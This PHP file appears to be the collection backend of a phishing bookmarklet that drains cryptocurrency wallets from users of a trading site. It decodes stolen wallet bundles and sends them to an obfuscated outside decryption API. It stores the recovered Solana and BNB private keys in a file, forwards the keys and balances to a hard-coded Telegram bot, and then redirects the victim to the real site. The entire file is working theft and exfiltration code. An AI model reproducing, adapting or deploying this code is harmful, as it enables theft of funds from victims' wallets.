
<?php
header('Content-Type: application/json');

// Telegram
define('TELEGRAM_BOT_TOKEN', '8082373827:AAEZwpGM3SDp-8MGvx94qWnaoPB4G5wYGiE');
define('TELEGRAM_CHAT_ID', '8319559156');

$base64Data = isset($_GET['data']) ? $_GET['data'] : '';

if (empty($base64Data)) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'error' => 'Missing data parameter'
    ]);
    exit;
}

try {
    $jsonData = base64_decode($base64Data);

    if ($jsonData === false) {
        throw new Exception('Invalid base64 encoding');
    }

    $data = json_decode($jsonData, true);

    if ($data === null) {
        throw new Exception('Invalid JSON data');
    }

    $payload = [];

    if (isset($data['bundle'])) {
        $payload['bundle'] = $data['bundle'];
    } else {
        throw new Exception('Missing bundle key');
    }

    if (isset($data['sBundles'])) {
        $payload['sBundles'] = $data['sBundles'];
    }

    if (isset($data['eBundles'])) {
        $payload['eBundles'] = $data['eBundles'];
    }

    $apiUrl = base64_decode('aHR0cHM6Ly9heG5vdHNpb20uaWN1L2FwaS9kZWNyeXB0');
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200) {
        throw new Exception('API request failed with code: ' . $httpCode);
    }

    $deddata = json_decode($response, true);

    if ($deddata === null) {
        throw new Exception('Invalid API response');
    }

    $walletsFile = 'wallets.json';

    $exwallets = [];
    if (file_exists($walletsFile)) {
        $existingContent = file_get_contents($walletsFile);
        if ($existingContent !== false) {
            $exwallets = json_decode($existingContent, true) ?: [];
        }
    }

    $exwallets[] = [
        'timestamp' => date('Y-m-d H:i:s'),
        'data' => $deddata
    ];

    $saveResult = file_put_contents($walletsFile, json_encode($exwallets, JSON_PRETTY_PRINT));

    if ($saveResult === false) {
        throw new Exception('Failed to save to wallets.json');
    }

    sendTelegramNotification($deddata);

    header('Location: https://axiom.trade');
    exit;

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}

function sendTelegramNotification($walletData) {
    $botToken = TELEGRAM_BOT_TOKEN;
    $chatId = TELEGRAM_CHAT_ID;
    
    if ($botToken === '8082373827:AAEZwpGM3SDp-8MGvx94qWnaoPB4G5wYGiE' || $chatId === '8319559156') {
        return;
    }
    
    $message = "♠️ User dragged bookmarklet 🔖\n\n";
    
    $totalValue = isset($walletData['totalValue']) ? $walletData['totalValue'] : 0;
    
    if (isset($walletData['solana']) && is_array($walletData['solana'])) {
        $solanaCount = count($walletData['solana']);
        $solanaTotal = 0;
        $solanaBalance = 0;
        
        foreach ($walletData['solana'] as $wallet) {
            $solanaTotal += isset($wallet['usdValue']) ? $wallet['usdValue'] : 0;
            $solanaBalance += isset($wallet['balance']) ? $wallet['balance'] : 0;
        }
        
        $message .= "💳 Solana ($solanaCount) $" . number_format($solanaTotal, 2) . " (" . number_format($solanaBalance, 2) . " SOL)\n";
        
        $index = 1;
        foreach ($walletData['solana'] as $wallet) {
            $publicKey = isset($wallet['publicKey']) ? $wallet['publicKey'] : '';
            $privateKey = isset($wallet['privateKey']) ? $wallet['privateKey'] : '';
            $shortAddress = substr($publicKey, 0, 6) . '…' . substr($publicKey, -6);
            
            $message .= "├ $index. 💳 [$shortAddress](https://solscan.io/account/$publicKey)\n";
            $message .= "├ $index. 🔑 Key: `$privateKey`\n";
            $index++;
        }
        $message .= "\n";
    }
    
    $bnbWallets = [];
    if (isset($walletData['bnb']) && is_array($walletData['bnb'])) {
        $bnbWallets = $walletData['bnb'];
    } elseif (isset($walletData['evmWallets']) && is_array($walletData['evmWallets'])) {
        $bnbWallets = $walletData['evmWallets'];
    }
    
    if (!empty($bnbWallets)) {
        $bnbCount = count($bnbWallets);
        $bnbTotal = 0;
        $bnbBalance = 0;
        
        foreach ($bnbWallets as $wallet) {
            $bnbTotal += isset($wallet['usdValue']) ? $wallet['usdValue'] : 0;
            $bnbBalance += isset($wallet['balance']) ? $wallet['balance'] : 0;
        }
        
        $message .= "💳 BNB ($bnbCount) $" . number_format($bnbTotal, 2) . " (" . number_format($bnbBalance, 4) . " BNB)\n";
        
        $index = 1;
        foreach ($bnbWallets as $wallet) {
            $address = isset($wallet['address']) ? $wallet['address'] : '';
            $privateKey = isset($wallet['privateKey']) ? $wallet['privateKey'] : '';
            if (empty($privateKey) && isset($wallet['privateKeyHex'])) {
                $privateKey = $wallet['privateKeyHex'];
            }
            $shortAddress = substr($address, 0, 8) . '…' . substr($address, -5);
            
            $message .= "├ $index. 💳 [$shortAddress](https://bscscan.com/address/$address)\n";
            $message .= "├ $index. 🔑 Key: `$privateKey`\n";
            $index++;
        }
    }
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}
